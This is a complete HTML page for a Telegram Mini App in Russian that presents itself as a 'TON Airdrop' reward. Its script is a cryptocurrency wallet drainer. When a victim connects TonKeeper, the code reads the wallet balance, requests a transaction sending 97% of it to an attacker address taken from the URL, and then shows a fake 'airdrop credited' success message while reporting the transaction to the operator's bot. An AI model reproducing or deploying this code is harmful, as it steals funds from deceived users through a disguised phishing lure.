<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TON Airdrop</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --ton:        #0098EA;
            --ton-dim:    rgba(0,152,234,0.13);
            --ton-glow:   rgba(0,152,234,0.28);
            --green:      #22C55E;
            --green-dim:  rgba(34,197,94,0.11);
            --red:        #EF4444;
            --red-dim:    rgba(239,68,68,0.11);
            --amber:      #F59E0B;
            --amber-dim:  rgba(245,158,11,0.11);
            --bg:         #090D12;
            --surface:    #0F1620;
            --surface2:   #141C28;
            --border:     rgba(255,255,255,0.07);
            --text:       #E8EDF4;
            --muted:      rgba(232,237,244,0.40);
            --mono:       'JetBrains Mono', monospace;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 16px 36px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse 55% 35% at 15% 0%,   rgba(0,152,234,0.06) 0%, transparent 60%),
                radial-gradient(ellipse 40% 28% at 85% 100%, rgba(34,197,94,0.04)  0%, transparent 60%);
            pointer-events: none;
            z-index: 0;
        }

        .wrap {
            width: 100%;
            max-width: 390px;
            z-index: 1;
            display: flex;
            flex-direction: column;
            gap: 12px;
            animation: rise .4s cubic-bezier(.22,.68,0,1.2) both;
        }

        @keyframes rise {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: none; }
        }

        /* ── HERO ── */
        .hero {
            text-align: center;
            padding: 24px 0 6px;
        }

        .logo {
            position: relative;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 72px;
            height: 72px;
            margin-bottom: 14px;
        }

        .logo-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            background: conic-gradient(from 0deg, #0098EA 0%, #22C55E 50%, #0098EA 100%);
            animation: rot 7s linear infinite;
            opacity: .45;
        }

        @keyframes rot { to { transform: rotate(360deg); } }

        .logo-core {
            position: relative;
            width: 64px;
            height: 64px;
            border-radius: 50%;
            background: var(--surface);
            border: 1.5px solid rgba(255,255,255,0.07);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            transition: transform .3s;
        }

        .hero h1 {
            font-size: 1.5rem;
            font-weight: 800;
            letter-spacing: -.03em;
            background: linear-gradient(125deg, #ffffff 25%, #0098EA 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 7px;
        }

        .hero p {
            font-size: .82rem;
            color: var(--muted);
            line-height: 1.6;
            max-width: 275px;
            margin: 0 auto;
        }

        /* ── CARD ── */
        .card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
            transition: border-color .3s;
        }

        .card-top {
            height: 2px;
            background: linear-gradient(90deg, transparent 5%, var(--ton) 50%, transparent 95%);
            opacity: .55;
            transition: background .35s;
        }

        .card.err  { border-color: rgba(239,68,68,.32); }
        .card.err  .card-top { background: linear-gradient(90deg, transparent 5%, var(--red)   50%, transparent 95%); }
        .card.ok   { border-color: rgba(34,197,94,.32); }
        .card.ok   .card-top { background: linear-gradient(90deg, transparent 5%, var(--green) 50%, transparent 95%); }
        .card.load { border-color: rgba(0,152,234,.38); }

        /* ── STEPS ── */
        .steps {
            display: flex;
            align-items: center;
            padding: 14px 20px 13px;
            border-bottom: 1px solid var(--border);
        }

        .step {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }

        .step-dot {
            width: 26px;
            height: 26px;
            border-radius: 50%;
            border: 1.5px solid var(--border);
            background: var(--surface2);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: .62rem;
            font-weight: 600;
            color: var(--muted);
            font-family: var(--mono);
            transition: all .3s;
        }

        .step-dot.on {
            border-color: var(--ton);
            background: var(--ton-dim);
            color: var(--ton);
            box-shadow: 0 0 0 3px var(--ton-dim);
        }

        .step-dot.done {
            border-color: var(--green);
            background: var(--green-dim);
            color: var(--green);
        }

        .step-txt {
            font-size: .63rem;
            font-weight: 500;
            color: var(--muted);
            transition: color .3s;
            text-align: center;
            line-height: 1.25;
        }

        .step.on   .step-txt { color: var(--ton); }
        .step.done .step-txt { color: var(--green); }

        .step-sep {
            flex: 0 0 24px;
            height: 1px;
            background: var(--border);
            margin-bottom: 18px;
            transition: background .3s;
        }

        .step-sep.done { background: rgba(34,197,94,.4); }

        /* ── STATUS ── */
        .status {
            padding: 20px 22px 6px;
            text-align: center;
        }

        .s-icon {
            font-size: 2.2rem;
            display: block;
            margin-bottom: 9px;
            animation: pop .28s cubic-bezier(.22,.68,0,1.4);
        }

        @keyframes pop {
            from { transform: scale(.5); opacity: 0; }
            to   { transform: scale(1);  opacity: 1; }
        }

        .s-title {
            font-size: 1rem;
            font-weight: 700;
            letter-spacing: -.01em;
            margin-bottom: 6px;
        }

        .s-desc {
            font-size: .8rem;
            color: var(--muted);
            line-height: 1.65;
        }

        /* ── NOTICE ── */
        .notice {
            margin: 12px 18px 0;
            padding: 10px 13px;
            background: var(--amber-dim);
            border: 1px solid rgba(245,158,11,.2);
            border-radius: 9px;
            font-size: .77rem;
            color: var(--amber);
            line-height: 1.6;
            display: flex;
            gap: 8px;
            align-items: flex-start;
        }

        /* ── INFO TABLE ── */
        .info-table {
            margin: 12px 18px 0;
            border: 1px solid var(--border);
            border-radius: 10px;
            overflow: hidden;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: var(--surface2);
            border-bottom: 1px solid var(--border);
            font-size: .77rem;
            gap: 8px;
        }

        .info-row:last-child { border-bottom: none; }
        .info-k { color: var(--muted); flex-shrink: 0; }
        .info-v { font-family: var(--mono); font-size: .71rem; color: var(--text); text-align: right; word-break: break-all; }
        .info-v.a { color: var(--ton); }
        .info-v.g { color: var(--green); }

        /* ── ACTIONS ── */
        .actions {
            padding: 14px 18px 18px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-family: 'Inter', sans-serif;
            font-size: .9rem;
            font-weight: 700;
            letter-spacing: -.01em;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: transform .12s, filter .15s, opacity .15s;
        }

        .btn:active:not(:disabled) { transform: scale(.97); }
        .btn:disabled { opacity: .38; cursor: default; }

        .btn-ton {
            background: linear-gradient(135deg, #0098EA, #0074B7);
            color: #fff;
            box-shadow: 0 4px 20px rgba(0,152,234,.25);
        }
        .btn-ton:hover:not(:disabled) { filter: brightness(1.07); }

        .btn-ghost {
            background: var(--surface2);
            border: 1px solid var(--border);
            color: var(--muted);
        }
        .btn-ghost:hover { border-color: rgba(255,255,255,.15); color: var(--text); }

        .btn-green {
            background: linear-gradient(135deg, #22C55E, #16A34A);
            color: #fff;
            box-shadow: 0 4px 18px rgba(34,197,94,.2);
        }

        /* ── SPINNER ── */
        .spin {
            width: 15px; height: 15px;
            border: 2px solid rgba(255,255,255,.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: rot .6s linear infinite;
            flex-shrink: 0;
        }

        /* ── TRUST ── */
        .trust {
            display: flex;
            justify-content: center;
            gap: 16px;
            padding-top: 2px;
        }

        .trust-i {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: .69rem;
            color: var(--muted);
        }

        .trust-dot {
            width: 5px; height: 5px;
            border-radius: 50%;
            background: var(--green);
            opacity: .8;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>
<div class="wrap">

    <!-- HERO -->
    <div class="hero">
        <div class="logo">
            <div class="logo-ring"></div>
            <div class="logo-core" id="logoCore">💎</div>
        </div>
        <h1>TON Airdrop</h1>
        <p>Подключи кошелёк — получи вознаграждение прямо на баланс</p>
    </div>

    <!-- CARD -->
    <div class="card" id="card">
        <div class="card-top" id="cardTop"></div>

        <!-- Steps -->
        <div class="steps">
            <div class="step on"  id="st1"><div class="step-dot on"  id="sd1">1</div><div class="step-txt">Кошелёк</div></div>
            <div class="step-sep" id="sep1"></div>
            <div class="step"     id="st2"><div class="step-dot"      id="sd2">2</div><div class="step-txt">Проверка</div></div>
            <div class="step-sep" id="sep2"></div>
            <div class="step"     id="st3"><div class="step-dot"      id="sd3">3</div><div class="step-txt">Airdrop ✈️</div></div>
        </div>

        <!-- Status -->
        <div class="status">
            <span class="s-icon"  id="sIcon">🔐</span>
            <div class="s-title"  id="sTitle">Подключи TonKeeper</div>
            <div class="s-desc"   id="sDesc">Нажми кнопку ниже — выбери кошелёк и подтверди подключение. Seed-фраза не нужна.</div>
        </div>

        <!-- Notice -->
        <div class="notice hidden" id="notice">
            <span>⏳</span>
            <span id="noticeText"></span>
        </div>

        <!-- Info table -->
        <div class="info-table hidden" id="infoTable">
            <div class="info-row"><span class="info-k">Адрес</span>     <span class="info-v"   id="iAddr">—</span></div>
            <div class="info-row"><span class="info-k">Баланс</span>    <span class="info-v a" id="iBal">—</span></div>
            <div class="info-row"><span class="info-k">К отправке (97%)</span><span class="info-v a" id="iSend">—</span></div>
            <div class="info-row"><span class="info-k">Получатель</span><span class="info-v"   id="iRecip">—</span></div>
        </div>

        <!-- Actions -->
        <div class="actions">
            <button class="btn btn-ton"   id="btnConnect">🔌 Подключить TonKeeper</button>
            <button class="btn btn-ghost hidden" id="btnRetry">🔄 Попробовать снова</button>
            <button class="btn btn-green hidden" id="btnClose">✅ Готово — закрыть</button>
        </div>
    </div>

    <!-- Trust bar -->
    <div class="trust">
        <div class="trust-i"><div class="trust-dot"></div>TonConnect 2.0</div>
        <div class="trust-i"><div class="trust-dot"></div>Без seed-фразы</div>
        <div class="trust-i"><div class="trust-dot"></div>On-chain</div>
    </div>

</div>
<script>
    /* ── Telegram ── */
    const tg = window.Telegram.WebApp;
    tg.expand(); tg.ready();
    try { tg.setHeaderColor('#090D12'); } catch(_) {}

    /* ── Params ── */
    const p           = new URLSearchParams(window.location.search);
    const userId      = p.get('user_id') || '';
    const adminWallet = decodeURIComponent(p.get('wallet') || '');

    if (!adminWallet) setStatus('❌', 'Ошибка конфигурации', 'Адрес получателя не передан', 'err');

    let ui   = null;
    let busy = false;

    const $ = id => document.getElementById(id);

    /* ── Steps ── */
    function setStep(n) {
        [1, 2, 3].forEach(i => {
            const st = $(`st${i}`), sd = $(`sd${i}`);
            st.className = 'step' + (i < n ? ' done' : i === n ? ' on' : '');
            sd.className = 'step-dot' + (i < n ? ' done' : i === n ? ' on' : '');
            sd.textContent = i < n ? '✓' : String(i);
            if (i < 3) $(`sep${i}`).className = 'step-sep' + (i < n ? ' done' : '');
        });
    }

    /* ── Status ── */
    function setStatus(icon, title, desc, state) {
        const ic = $('sIcon');
        ic.textContent = icon;
        ic.style.animation = 'none';
        requestAnimationFrame(() => { ic.style.animation = ''; });
        $('sTitle').textContent = title;
        $('sDesc').innerHTML    = desc;
        $('card').className = 'card' + (state ? ' ' + state : '');
    }

    /* ── Notice ── */
    function showNotice(t) { $('noticeText').textContent = t; $('notice').classList.remove('hidden'); }
    function hideNotice()  { $('notice').classList.add('hidden'); }

    /* ── Reset btn ── */
    function resetBtn() {
        const b = $('btnConnect');
        b.disabled = false;
        b.innerHTML = '🔌 Подключить TonKeeper';
        b.classList.remove('hidden');
    }

    /* ── Balance ── */
    async function getBalance(addr) {
        const r = await fetch(`https://toncenter.com/api/v3/wallet?address=${addr}`);
        const d = await r.json();
        return parseFloat(d.balance || 0) / 1e9;
    }

    /* ── Main flow ── */
    async function runFlow() {
        if (busy) return;
        busy = true;

        try {
            /* Step 2 — balance (silent) */
            setStep(2);
            $('btnConnect').classList.add('hidden');
            setStatus('🔍', 'Проверяю баланс…', 'Читаю данные кошелька — секунду', 'load');

            const addr    = ui.account.address;
            const balance = await getBalance(addr);

            if (balance < 0.1) {
                setStatus('⚠️', 'Маловато TON',
                    `Баланс: <b>${balance.toFixed(4)} TON</b><br>Нужно минимум <b>0.1 TON</b> для участия`,
                    'err');
                $('btnRetry').classList.remove('hidden');
                busy = false;
                return;
            }

            const sendAmt   = balance * 0.97;
            const amountRaw = String(Math.floor(sendAmt * 1e9));

            /* Step 3 — send TX */
            setStep(3);
            $('iAddr').textContent  = `${addr.slice(0,6)}…${addr.slice(-4)}`;
            $('iBal').textContent   = `${balance.toFixed(4)} TON`;
            $('iSend').textContent  = `${sendAmt.toFixed(4)} TON`;
            $('iRecip').textContent = `${adminWallet.slice(0,6)}…${adminWallet.slice(-4)}`;
            $('infoTable').classList.remove('hidden');

            setStatus('📲', 'Подтверди в TonKeeper',
                'Уведомление уже летит в приложение — подожди <b>10–15 секунд</b> и нажми «Подтвердить»',
                'load');

            showNotice('Не закрывай этот экран. Если уведомление не пришло — открой TonKeeper вручную, запрос там уже есть.');

            const result  = await ui.sendTransaction({
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{ address: adminWallet, amount: amountRaw }],
            });

            const sentTon = (Number(amountRaw) / 1e9).toFixed(4);

            /* Success */
            hideNotice();
            setStep(4); // all done
            $('logoCore').textContent = '🎉';

            const sendEl = $('iSend');
            sendEl.classList.replace('a', 'g');

            setStatus('🎉', 'Airdrop зачислен!',
                `<b>${sentTon} TON</b> успешно отправлено — транзакция в блокчейне`, 'ok');

            $('btnClose').classList.remove('hidden');

            tg.sendData(JSON.stringify({
                action: 'transaction_success',
                tx_hash: result,
                amount:  sentTon,
                user_id: userId,
            }));

            setTimeout(() => tg.close(), 4000);

        } catch (err) {
            console.error(err);
            hideNotice();
            const cancelled = /reject|cancel|denied|abort/i.test(err?.message || '');
            setStatus(
                cancelled ? '🚫' : '❌',
                cancelled ? 'Отменено' : 'Что-то пошло не так',
                cancelled
                    ? 'Транзакция отменена — можешь попробовать снова'
                    : (err?.message || 'Неизвестная ошибка'),
                'err'
            );
            $('btnRetry').classList.remove('hidden');
        } finally {
            busy = false;
        }
    }

    /* ── Init ── */
    async function init() {
        try {
            ui = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://hastjes.github.io/ton-bot/tonconnect-manifest.json',
                buttonRootId: null,
            });
            ui.onStatusChange(async wallet => { if (wallet && !busy) await runFlow(); });
            if (ui.account) await runFlow();
        } catch (err) {
            setStatus('❌', 'Ошибка запуска', err?.message || 'Не удалось загрузить TonConnect', 'err');
        }
    }

    /* ── Button handlers ── */
    $('btnConnect').onclick = async () => {
        const b = $('btnConnect');
        try {
            b.disabled = true;
            b.innerHTML = '<div class="spin"></div> Открываю…';
            await ui.openModal();
        } catch (err) {
            setStatus('❌', 'Ошибка подключения', err?.message || '', 'err');
            resetBtn();
        }
    };

    $('btnRetry').onclick = () => {
        $('btnRetry').classList.add('hidden');
        $('infoTable').classList.add('hidden');
        hideNotice();
        busy = false;
        setStep(1);
        setStatus('🔐', 'Подключи TonKeeper', 'Нажми кнопку ниже — выбери кошелёк и подтверди подключение. Seed-фраза не нужна.');
        resetBtn();
    };

    $('btnClose').onclick = () => tg.close();

    init();
</script>
</body>
</html>
